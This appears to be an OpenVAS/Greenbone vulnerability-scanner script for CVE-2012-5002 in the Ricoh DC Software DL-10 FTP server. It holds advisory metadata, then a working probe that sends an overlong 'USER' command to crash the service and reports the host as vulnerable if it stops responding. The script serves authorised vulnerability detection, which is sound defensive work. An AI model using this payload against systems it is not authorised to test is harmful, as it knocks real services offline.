if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902821" );
	script_version( "2021-08-06T11:34:45+0000" );
	script_cve_id( "CVE-2012-5002" );
	script_bugtraq_id( 52235 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-08-06 11:34:45 +0000 (Fri, 06 Aug 2021)" );
	script_tag( name: "creation_date", value: "2012-03-26 14:14:14 +0530 (Mon, 26 Mar 2012)" );
	script_name( "Ricoh DC Software DL-10 FTP Server 'USER' Command Buffer Overflow Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/ricoh/dsc_ftpd/detected" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/47912" );
	script_xref( name: "URL", value: "http://security.inshell.net/advisory/5" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/52235" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/73591" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18643" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18658" );
	script_tag( name: "impact", value: "Successful exploitation may allow remote attackers to execute
  arbitrary code within the context of the affected application. Failed exploit
  attempts will result in a denial-of-service condition." );
	script_tag( name: "affected", value: "Ricoh DC Software DL-10 version 4.5.0.1." );
	script_tag( name: "insight", value: "The flaw is caused by improper bounds checking by the FTP server
  when processing malicious FTP commands. This can be exploited to cause a
  stack-based buffer overflow via an overly long 'USER' FTP command." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Ricoh DC Software DL-10 FTP Server and is
  prone to buffer overflow vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "DSC ftpd" )){
	exit( 0 );
}
soc = open_sock_tcp( ftpPort );
if(!soc){
	exit( 0 );
}
exploit = "USER " + crap( 300 );
ftp_send_cmd( socket: soc, cmd: exploit );
ftp_close( socket: soc );
sleep( 2 );
soc1 = open_sock_tcp( ftpPort );
if(!soc1){
	security_message( ftpPort );
	exit( 0 );
}
ftp_close( socket: soc1 );

